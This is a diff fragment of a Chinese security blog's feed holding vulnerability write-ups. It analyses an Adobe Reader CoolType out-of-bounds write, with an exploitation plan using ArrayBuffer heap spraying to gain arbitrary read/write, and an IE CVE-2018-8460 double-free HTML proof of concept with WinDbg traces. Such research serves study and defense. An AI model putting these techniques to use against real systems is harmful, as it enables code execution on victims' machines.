+  MultByteSize_1 = size;
+  if ( !cbMultiByte )
+  {
+LABEL_4:
+    v7 = cbMultiByte + lpMultiByteStr;
+    v8 = 2 * cbMultiByte;
+    *(_DWORD *)MultByteSize = 2 * cbMultiByte;
+    if ( 2 * cbMultiByte )
+    {
+      do
+      {
+        v9 = *(_BYTE *)--v7;
+        *((char *)MultByte + v8 - 1) = 0;
+        v10 = v8 == 2;
+        v8 -= 2;
+        *((_BYTE *)MultByte + v8) = v9;
+      }
+      while ( !v10 );
+    }
+    return 1;
+  }
+  while ( (unsigned __int8)(*v5 - 0x20) &lt;= 0x5Du )
+  {
+    ++v5;
+    if ( ++v15 &gt;= (unsigned int)cbMultiByte )
+      goto LABEL_4;
+  }
+  CodePage = GetCodePage(a1);
+  WideCharSize = off_82FF304(CodePage, 0, lpMultiByteStr, cbMultiByte, lpWideCharStr, 0x100);// 该函数为MultiByteToWideCharStub
+  if ( WideCharSize &amp;&amp; WideCharSize &lt;= 0x100 )
+  {
+    v14 = 2 * WideCharSize;
+    sub_800C383(MultByte, MultByteSize_1, lpWideCharStr, 2 * WideCharSize);// 内部调用memcpy
+    *(_DWORD *)MultByteSize = v14;
+    return 1;
+  }
+  *(_DWORD *)MultByteSize = MultByteSize_1;
+  if ( sub_81443C0(a1, lpMultiByteStr, cbMultiByte, MultByte, (size_t *)MultByteSize) )
+    return 1;
+  *(_DWORD *)MultByteSize = MultByteSize_1;
+  return sub_81442A2(a1, lpMultiByteStr, cbMultiByte, (int)MultByte, MultByteSize) != 0;
+}
+</code></pre></div></div>
+
+<p>转换完毕后调用<code class="language-plaintext highlighter-rouge">sub_800C383</code>，检查当前MultByteSize大于等于2倍的WideCharSize时才会将转换后的宽字节字符串拷贝至原字符串的位置，否则将原字符串清空：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>size_t __cdecl sub_800C383(void *MultByte, size_t MultByteSize, void *WideChar, size_t WideCharSize_double)
+{
+  size_t v4; // esi
+  int *v5; // eax
+  int v7; // [esp-8h] [ebp-Ch]
+
+  v4 = WideCharSize_double;
+  if ( WideCharSize_double )
+  {
+    if ( MultByte )
+    {
+      if ( WideChar &amp;&amp; MultByteSize &gt;= WideCharSize_double )
+      {
+        memcpy(MultByte, WideChar, WideCharSize_double);
+        return 0;
+      }
+      else
+      {
+        memset(MultByte, 0, MultByteSize);
+        if ( WideChar )
+        {
+          if ( MultByteSize &gt;= WideCharSize_double )
+            return 0x16;
+          v5 = errno();
+          v7 = 0x22;
+        }
+        else
+        {
+          v5 = errno();
+          v7 = 0x16;
+        }
+        v4 = v7;
+        *v5 = v7;
+        invalid_parameter_noinfo();
+      }
+    }
+    else
+    {
+      v4 = 0x16;
+      *errno() = 0x16;
+      invalid_parameter_noinfo();
+    }
+  }
+  return v4;
+}
+</code></pre></div></div>
+
+<p>调试至<code class="language-plaintext highlighter-rouge">MultiByteToWideCharStub</code>函数，转化后WideChar字符串的字符数为0x23个：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; g
+Breakpoint 2 hit
+eax=000003a8 ebx=1306e8a8 ecx=0b9aea08 edx=1306e8a8 esi=00000024 edi=0b9aec3c
+eip=724040e9 esp=0b9ae9d8 ebp=0b9aec0c iopl=0         nv up ei ng nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+CoolType!CTGetVersion+0x58ab9:
+724040e9 ff1504f35b72    call    dword ptr [CoolType!CTGetVersion+0x213cd4 (725bf304)] ds:002b:725bf304={KERNEL32!MultiByteToWideCharStub (75603da0)}
+0:008&gt; dps esp L6
+0b9ae9d8  000003a8	//CodePage
+0b9ae9dc  00000000	//dwFlags
+0b9ae9e0  1306e8a8	//lpMultiByteStr
+0b9ae9e4  00000024	//cbMultiByte
+0b9ae9e8  0b9aea08	//lpWideCharStr
+0b9ae9ec  00000100	//cchWideChar
+0:008&gt; dd 1306e8a8 Lc
+1306e8a8  5001d608 51015001 61015101 62016101
+1306e8b8  31016201 7a540f51 01521d18 20736e18
+1306e8c8  74736574 74747474 74747474 00007474
+0:008&gt; dd 0b9aea08 Lc
+0b9aea08  0c4ef818 0c4ef810 0b9aea4c 6f6c53a8
+0b9aea18  1306ded0 0c4c5588 00000000 00000000
+0b9aea28  0b9aea50 6dc1901f 6dc19024 1fbe9e77
+0:008&gt; p
+eax=00000023 ebx=1306e8a8 ecx=c7dacb9e edx=0b9aea08 esi=00000024 edi=0b9aec3c
+eip=724040ef esp=0b9ae9f0 ebp=0b9aec0c iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+CoolType!CTGetVersion+0x58abf:
+724040ef 85c0            test    eax,eax
+0:008&gt; dd 0b9aea08 L23*2/4	//转换后0x23个字符的WideChar字符串
+0b9aea08  003f0008 00010050 00010050 00010051
+0b9aea18  00010051 00010061 00010061 00010062
+0b9aea28  00010062 00510031 0054000f 0018007a
+0b9aea38  0052001d 00180001 0073006e 00740020
+0b9aea48  00730065
+</code></pre></div></div>
+
+<p>继续执行到<code class="language-plaintext highlighter-rouge">sub_800C383</code>，由于当前MultiByteSize小于WideCharSize * 2，会执行<code class="language-plaintext highlighter-rouge">memset</code>函数清空MultiByteStr：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
+eax=0000002e ebx=1306e8a8 ecx=c7dacb9e edx=0b9aea08 esi=00000046 edi=0b9aec3c
+eip=7240410d esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei ng nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000283
+CoolType!CTGetVersion+0x58add:
+7240410d e87182ecff      call    CoolType!CTInit+0x8d93 (722cc383)
+0:008&gt; dps esp L4
+0b9ae9e0  1306e8a8		//MultiByteStr
+0b9ae9e4  0000002e		//MultiByteSize
+0b9ae9e8  0b9aea08		//WideCharStr
+0b9ae9ec  00000046		//WideCharSize * 2
+0:008&gt; dd 1306e8a8 Lc	//原MultiByte字符串
+1306e8a8  5001d608 51015001 61015101 62016101
+1306e8b8  31016201 7a540f51 01521d18 20736e18
+1306e8c8  74736574 74747474 74747474 00007474
+0:008&gt; p
+eax=00000022 ebx=1306e8a8 ecx=7df11661 edx=00000000 esi=00000046 edi=0b9aec3c
+eip=72404112 esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
+CoolType!CTGetVersion+0x58ae2:
+72404112 83c410          add     esp,10h
+0:008&gt; dd 1306e8a8 Lc	//执行函数后被清空
+1306e8a8  00000000 00000000 00000000 00000000
+1306e8b8  00000000 00000000 00000000 00000000
+1306e8c8  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>随后遍历被清空的MultByteStr，遍历的次数为转换后的WideChar的大小。当前MultByte的大小为0x2e，WideChar的大小为0x46。因此遍历到超过MultByte的大小时就造成了越界访问。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LABEL_83:
+    if ( (_WORD)MultSize )
+    {
+      v44 = (_BYTE *)(EmptyMultByteStr + 1);
+      v45 = ~EmptyMultByteStr;
+      v51 = ~EmptyMultByteStr;
+      do
+      {
+        if ( *(v44 - 1) || *v44 )		//POC崩溃处
+        {
+          if ( &amp;v44[v45] != (_BYTE *)offset )
+          {
+            *(_BYTE *)(EmptyMultByteStr + offset) = *(v44 - 1);
+            *(_BYTE *)(offset + EmptyMultByteStr + 1) = *v44;
+          }
+          offset += 2;
+        }
+        MultSize = *(unsigned __int16 *)a3;
+        v44 += 2;
+        v46 = (int)&amp;v44[v45] &lt; MultSize;
+        v45 = v51;
+      }
+      while ( v46 );
+    }
+    *(_WORD *)a3 = offset;
+    return MultSize;
+  }
+</code></pre></div></div>
+
+<h1 id="利用思路">利用思路</h1>
+
+<p>该漏洞的利用方式和大部分越界写漏洞一致：</p>
+
+<ol>
+  <li>通过堆喷射ArrayBuffer对象制造MultByteStr大小的内存空洞</li>
+  <li>触发漏洞，MultByteStr位于两个ArrayBuffer对象之间</li>
+  <li>绕过<code class="language-plaintext highlighter-rouge">sub_800C383</code>的字符串长度校验，将WideChar的字符串覆盖临近ArrayBuffer对象的Length属性值，构造越界写原语</li>
+  <li>通过越界写原语修改下一个临近ArrayBuffer对象的Length属性为0xFFFFFFFF，构造任意地址读写原语</li>
+</ol>
+
+<p>有了思路之后，首先需要确定控制MultByteStr大小的值位于POC中的位置，通过逆向可以得知该值通过一系列运算确定：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall GetMultStr(int this, __int16 a2, __int16 a3, __int16 a4, __int16 a5, unsigned __int16 *a6)
+{
+  int v7; // ebx
+  unsigned __int8 *OriginStr; // esi
+  __int16 v9; // cx
+  __int16 v10; // dx
+  unsigned __int16 MultiByteLength; // cx
+  int MultiByteStr; // esi
+  unsigned __int16 v14; // [esp+10h] [ebp-10h]
+  unsigned __int16 v15; // [esp+14h] [ebp-Ch]
+  unsigned __int16 v16; // [esp+18h] [ebp-8h]
+  unsigned __int8 v17; // [esp+1Eh] [ebp-2h]
+  unsigned __int8 v18; // [esp+1Fh] [ebp-1h]
+
+  v7 = 0;
+  if ( !*(_DWORD *)(this + 8) )
+    return 0;
+  OriginStr = *(unsigned __int8 **)(this + 0x18);
+  if ( !*(_WORD *)(this + 0x14) )
+    return 0;
+  while ( 1 )
+  {
+    v9 = *OriginStr;
+    OriginStr += 0xC;
+    v10 = *(OriginStr - 11) | (unsigned __int16)(v9 &lt;&lt; 8);
+    v16 = _byteswap_ushort(*((_WORD *)OriginStr - 5));
+    v15 = _byteswap_ushort(*((_WORD *)OriginStr - 4));
+    v14 = _byteswap_ushort(*((_WORD *)OriginStr - 3));
+    v18 = *(OriginStr - 2);
+    MultiByteLength = _byteswap_ushort(*((_WORD *)OriginStr - 2));	//获取MultiByteStr的长度
+    v17 = *(OriginStr - 1);
+    if ( a2 == v10 &amp;&amp; a3 == v16 &amp;&amp; a4 == v15 &amp;&amp; a5 == v14 )
+      break;
+    if ( (unsigned __int16)++v7 &gt;= *(_WORD *)(this + 0x14) )
+      return 0;
+  }
+  *a6 = MultiByteLength;
+  MultiByteStr = *(_DWORD *)(this + 4) + *(unsigned __int16 *)(this + 0x16) + (v17 | (v18 &lt;&lt; 8));	//获取MultiByteStr
+  if ( (unsigned __int8)((_DWORD (__stdcall *)(int, _DWORD))sub_801A99B)(MultiByteStr, MultiByteLength) )
+    return MultiByteStr;
+  else
+    return 0;
+}
+</code></pre></div></div>
+
+<p>确定MultiByteStr的长度后，会调用malloc函数申请大小为MultiByteStr长度加1的内存空间，并将MultiByteStr拷贝到该块内存中：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while ( 1 )
+  {
+    oldMultStr = (void *)GetMultStr(3, v13, (__int16)Src, a4, MultiByte);// 循环获取到str
+    if ( LOWORD(MultiByte[0]) )
+      break;
+    if ( ++v13 &gt; 0xA )
+      goto LABEL_22;
+  }
+  v14 = (void *)alloc(LOWORD(MultiByte[0]) + 1);// 调用malloc申请大小为MultiByteStr长度加1的内存空间
+  memcpy(v14, oldMultStr, LOWORD(MultiByte[0]));// 拷贝MultiByteStr到新申请的内存中
+</code></pre></div></div>
+
+<p>修改POC使得MultiByteStr的长度为0x10f，通过JS代码堆喷射大小为0x100的ArrayBuffer对象同时制造内存空洞，使得MultiByteStr位于两个ArrayBuffer对象之中，修改后的内存布局如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
+Breakpoint 0 hit
+eax=0000010f ebx=0b5aea10 ecx=0b5aec3c edx=0000010f esi=1db0a4a0 edi=00000001
+eip=709bfcb0 esp=0b5ae838 ebp=0b5ae9d4 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+CoolType!CTInit+0x1c6c0:
+709bfcb0 55              push    ebp
+0:009&gt; dps esp+4 L7
+0b5ae83c  1db0a4a0
+0b5ae840  0000010f
+0b5ae844  0b5ae8f0
+0b5ae848  00000001
+0b5ae84c  00000000
+0b5ae850  00000001
+0b5ae854  00000000
+0:009&gt; dd 1db0a4a0 L(110*2+8)/4
+//----------------MultiByteStr---------------
+1db0a4a0  41004100 41004100 41004100 41004100
+1db0a4b0  41004100 41004100 41004100 41004100
+1db0a4c0  41004100 41004100 41004100 41004100
+1db0a4d0  41004100 41004100 41004100 41004100
+1db0a4e0  41004100 41004100 41004100 41004100
+1db0a4f0  41004100 41004100 41004100 41004100
+1db0a500  41004100 41004100 41004100 41004100
+1db0a510  41004100 41004100 41004100 41004100
+1db0a520  41004100 41004100 41004100 41004100
+1db0a530  41004100 41004100 41004100 41004100
+1db0a540  41004100 41004100 41004100 41004100
+1db0a550  41004100 41004100 41004100 41004100
+1db0a560  41004100 41004100 41004100 41004100
+1db0a570  41004100 41004100 41004100 41004100
+1db0a580  41004100 41004100 41004100 41004100
+1db0a590  41004100 41004100 41004100 41414100
+1db0a5a0  41414141 41414141 41414141 00414141
+//-------------------------------------------
+1db0a5b0  399fd8af 88009700 00000000 00000100	//Arraybuffer.ByteLength = 0x100
+1db0a5c0  00000000 00000000 ffffffff ffffffff
+1db0a5d0  ffffffff ffffffff ffffffff ffffffff
+1db0a5e0  ffffffff ffffffff ffffffff ffffffff
+1db0a5f0  ffffffff ffffffff ffffffff ffffffff
+1db0a600  ffffffff ffffffff ffffffff ffffffff
+1db0a610  ffffffff ffffffff ffffffff ffffffff
+1db0a620  ffffffff ffffffff ffffffff ffffffff
+1db0a630  ffffffff ffffffff ffffffff ffffffff
+1db0a640  ffffffff ffffffff ffffffff ffffffff
+1db0a650  ffffffff ffffffff ffffffff ffffffff
+1db0a660  ffffffff ffffffff ffffffff ffffffff
+1db0a670  ffffffff ffffffff ffffffff ffffffff
+1db0a680  ffffffff ffffffff ffffffff ffffffff
+1db0a690  ffffffff ffffffff ffffffff ffffffff
+1db0a6a0  ffffffff ffffffff ffffffff ffffffff
+1db0a6b0  ffffffff ffffffff ffffffff ffffffff
+1db0a6c0  ffffffff ffffffff
+</code></pre></div></div>
+
+<p>执行完毕<code class="language-plaintext highlighter-rouge">MultiToWide</code>函数后，临近Arraybuffer对象的长度被覆盖为0x410041：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; dd 1db0a4a0 L(110*2+8)/4
+//----------------MultiByteStr---------------
+1db0a4a0  00410041 00410041 00410041 00410041
+1db0a4b0  00410041 00410041 00410041 00410041
+1db0a4c0  00410041 00410041 00410041 00410041
+1db0a4d0  00410041 00410041 00410041 00410041
+1db0a4e0  00410041 00410041 00410041 00410041
+1db0a4f0  00410041 00410041 00410041 00410041
+1db0a500  00410041 00410041 00410041 00410041
+1db0a510  00410041 00410041 00410041 00410041
+1db0a520  00410041 00410041 00410041 00410041
+1db0a530  00410041 00410041 00410041 00410041
+1db0a540  00410041 00410041 00410041 00410041
+1db0a550  00410041 00410041 00410041 00410041
+1db0a560  00410041 00410041 00410041 00410041
+1db0a570  00410041 00410041 00410041 00410041
+1db0a580  00410041 00410041 00410041 00410041
+1db0a590  00410041 00410041 00410041 00410041
+1db0a5a0  00410041 00410041 00410041 00410041
+//-------------------------------------------
+1db0a5b0  00410041 00410041 00410041 00410041	//Arraybuffer.ByteLength = 0x410041
+1db0a5c0  00000000 00000000 ffffffff ffffffff
+1db0a5d0  ffffffff ffffffff ffffffff ffffffff
+1db0a5e0  ffffffff ffffffff ffffffff ffffffff
+1db0a5f0  ffffffff ffffffff ffffffff ffffffff
+1db0a600  ffffffff ffffffff ffffffff ffffffff
+1db0a610  ffffffff ffffffff ffffffff ffffffff
+1db0a620  ffffffff ffffffff ffffffff ffffffff
+1db0a630  ffffffff ffffffff ffffffff ffffffff
+1db0a640  ffffffff ffffffff ffffffff ffffffff
+1db0a650  ffffffff ffffffff ffffffff ffffffff
+1db0a660  ffffffff ffffffff ffffffff ffffffff
+1db0a670  ffffffff ffffffff ffffffff ffffffff
+1db0a680  ffffffff ffffffff ffffffff ffffffff
+1db0a690  ffffffff ffffffff ffffffff ffffffff
+1db0a6a0  ffffffff ffffffff ffffffff ffffffff
+1db0a6b0  ffffffff ffffffff ffffffff ffffffff
+1db0a6c0  ffffffff ffffffff
+</code></pre></div></div>
+
+<p>此时已经具有了越界写的能力，再次修改下一个临近Arraybuffer的对象的长度为0xFFFFFFFF即可完成读写原语的构造，剩下的利用过程大同小异就不再赘述了。</p>
+
+<p>最终在Windows 10上完成了整个利用：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/44707.gif" alt="44707" /></p>
+
+<h1 id="总结">总结</h1>
+
+<p>该漏洞为Adobe Reader越界写漏洞，由于解析字体将字符串转化为宽字节字符串时没有进行完整的校验导致越界拷贝，利用的难度不大且触发稳定。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[漏洞概述 该漏洞为2021年天府杯中使用的Adobe Reader越界写漏洞，漏洞位于字体解析模块：CoolType.dll中，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用</title><link href="http://localhost:4000/2022-09-09/CVE-2021-44711" rel="alternate" type="text/html" title="CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用" /><published>2022-09-09T00:00:00+08:00</published><updated>2022-09-09T00:00:00+08:00</updated><id>http://localhost:4000/2022-09-09/CVE-2021-44711</id><content type="html" xml:base="http://localhost:4000/2022-09-09/CVE-2021-44711"><![CDATA[<h1 id="前言">前言</h1>
 
 <p>最近看到一篇<a href="https://vul.360.net/archives/434">Adobe Reader 漏洞 CVE-2021-44711 利用浅析</a>漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。<!--more-->分析使用的软件版本为：<code class="language-plaintext highlighter-rouge">Adobe Acrobat Reader DC 2021.007.20099(x86)</code>。</p>
 
@@ -444,7 +1911,753 @@ EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+
 
 <h1 id="总结">总结</h1>
 
-<p>该漏洞利用难点在于如何将漏洞从越界内存访问转化为UAF，后续的利用过程和其他同类型漏洞大同小异。在利用过程中也得到了文章作者李双师傅的帮助，学习到了Adobe漏洞的利用技巧。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 最近看到一篇Adobe Reader 漏洞 CVE-2021-44711 利用浅析漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。]]></summary></entry><entry><title type="html">微软MSDT远程代码执行漏洞 CVE-2022-30190 分析</title><link href="http://localhost:4000/2022-06-10/CVE-2022-30190" rel="alternate" type="text/html" title="微软MSDT远程代码执行漏洞 CVE-2022-30190 分析" /><published>2022-06-10T00:00:00+08:00</published><updated>2022-06-10T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-10/CVE-2022-30190</id><content type="html" xml:base="http://localhost:4000/2022-06-10/CVE-2022-30190"><![CDATA[<h1 id="前言">前言</h1>
+<p>该漏洞利用难点在于如何将漏洞从越界内存访问转化为UAF，后续的利用过程和其他同类型漏洞大同小异。在利用过程中也得到了文章作者李双师傅的帮助，学习到了Adobe漏洞的利用技巧。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 最近看到一篇Adobe Reader 漏洞 CVE-2021-44711 利用浅析漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。]]></summary></entry><entry><title type="html">CVE-2018-8460 IE 漏洞利用</title><link href="http://localhost:4000/2022-06-24/CVE-2018-8460" rel="alternate" type="text/html" title="CVE-2018-8460 IE 漏洞利用" /><published>2022-06-24T00:00:00+08:00</published><updated>2022-06-24T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-24/CVE-2018-8460</id><content type="html" xml:base="http://localhost:4000/2022-06-24/CVE-2018-8460"><![CDATA[<h1 id="前言">前言</h1>
+
+<p>分析该漏洞的原因是看到ZDI的这篇分析文章：<a href="https://www.thezdi.com/blog/2018/10/18/cve-2018-8460-exposing-a-double-free-in-internet-explorer-for-code-execution">CVE-2018-8460: EXPOSING A DOUBLE FREE IN INTERNET EXPLORER FOR CODE EXECUTION</a>。里面详细分析了该漏洞的原理和利用思路，但是没有EXP，因此想尝试自己写出EXP。虽然最终没有成功写出EXP，但还是把学习的过程记录了下来，作为一个积累。<!--more--></p>
+
+<h1 id="漏洞成因">漏洞成因</h1>
+
+<p>poc如下：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Expires"</span> <span class="na">content=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+	
+<span class="kd">var</span> <span class="nx">iterationCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	
+<span class="kd">function</span> <span class="nx">testcase</span><span class="p">()</span> <span class="p">{</span>
+<span class="nx">elm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">ins</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">func</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">iterationCount</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="nx">iterationCount</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">12</span><span class="p">:</span>
+                <span class="k">case</span> <span class="mi">22</span><span class="p">:</span>
+                <span class="cm">/*case 34:*/</span>
+                        <span class="k">this</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">cssText</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;</span><span class="dl">'</span><span class="p">;</span>
+                        <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">elm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMAttrModified</span><span class="dl">'</span><span class="p">,</span> <span class="nx">func</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
+<span class="nx">elm</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">AAAAAAAAA</span><span class="dl">'</span>
+
+<span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span>
+
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">'testcase();'</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>下断<code class="language-plaintext highlighter-rouge">MSHTML!CWritableCSSStyleDeclaration::put_cssText</code>，查看添加cssText后的结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=0413a7e0
+eip=6bfb5de0 esp=0413a7d4 ebp=0413a7f8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dps poi(esp+4) L7					//还未执行put_cssText，Style中为空
+03cbe9c0  6bd3e8b4 MSHTML!CMSStyle::`vftable'
+03cbe9c4  00000001
+03cbe9c8  00000000
+03cbe9cc  00000008
+03cbe9d0  03c0cc00
+03cbe9d4  00000000
+03cbe9d8  0446aab0
+0:007&gt; dd 03c0cc00 L8
+03c0cc00  00000000 00000000 00000000 00000008
+03c0cc10  00000000 00000000 00000000 00000000
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第一次执行完后，Style中含有1个元素
+03c0cc00  00000010 00000001 03cbea00 00114098
+03c0cc10  00000000 00000000 00000000 00000000
+0:007&gt; dd 03cbea00 L4
+03cbea00  04090300 6be25b4c 00000001 0446b960
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第二次执行完后，Style中含有11个元素
+03c0cc00  00000034 0000000b 03cb4f70 0102c878
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cb4f70 Lb*4
+03cb4f70  04091400 6be39068 00000001 0000000f
+03cb4f80  0409140a 6be39068 00000001 0000000f
+03cb4f90  04091400 6be39140 00000001 0000000f
+03cb4fa0  0409140a 6be39140 00000001 0000000f
+03cb4fb0  04090300 6be25b4c 00000004 005700e4
+03cb4fc0  0409030a 6be25b4c 00000001 6bd8aca8
+03cb4fd0  04090300 6be25c58 00000002 03020c04
+03cb4fe0  0409030a 6be25c58 00000002 00000000
+03cb4ff0  84081f0a 8001140b 04d5cc68 04d5cc68
+03cb5000  808c1f0a 8001140b 04d5cd10 00000006
+03cb5010  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 							//输入的cssText
+04d5cc68  "char strict auto auto"
+0:007&gt; du 04d5cd10 
+04d5cd10  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; g
+Breakpoint 0 hit
+eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
+eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MSHTML!CWritableCSSStyleDeclaration::put_cssText:
+6bfb5de0 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//第三次执行完，Style中含有7个元素
+03c0cc00  00000024 00000007 03cbce10 00bdc648
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cbce10 L7*4
+03cbce10  04091400 6be39068 00000001 0000000f
+03cbce20  04091400 6be39140 00000001 0000000f
+03cbce30  04090300 6be25b4c 00000001 6ce7d8e4
+03cbce40  04090300 6be25c58 00000003 03020c04
+03cbce50  0409030a 6be25c58 00000002 00000000
+03cbce60  808c1f0a 8001140b 04d5cc68 6ce7d988
+03cbce70  84081f0a 8001140b 04d5cca0 04d5ccca
+0:007&gt; du 04d5cc68 							//cssText
+04d5cc68  "none fixed 49cp auto"
+0:007&gt; du 04d5cca0 
+04d5cca0  "char strict auto auto"
+0:007&gt; g
+Breakpoint 1 hit
+eax=04139704 ebx=1f9d2224 ecx=03c0cc00 edx=04139494 esi=800113eb edi=00000000
+eip=6bd64cb8 esp=041394e4 ebp=04139654 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; g
+Breakpoint 1 hit
+eax=03bf8000 ebx=00000006 ecx=03c0cc00 edx=00000000 esi=04139704 edi=03c0c160
+eip=6bd64cb8 esp=0413948c ebp=041394d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; g
+Breakpoint 1 hit
+eax=00000000 ebx=03cb83e0 ecx=03cb83e0 edx=00000005 esi=03cb83e0 edi=ffffffff
+eip=6bd64cb8 esp=0413c1e4 ebp=0413c1f4 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+MSHTML!CAttrArray::Free:
+6bd64cb8 8bff            mov     edi,edi
+0:007&gt; dd 03c0cc00 L8						//经过第四次put_cssText后，Style中含有10个元素
+03c0cc00  00000034 0000000a 03cb5040 00e04748
+03c0cc10  04d501e0 00000002 00000000 00000000
+0:007&gt; dd 03cb5040 La*4
+03cb5040  04091400 6be39068 00000002 0000000f
+03cb5050  0409140a 6be39068 00000001 0000000f
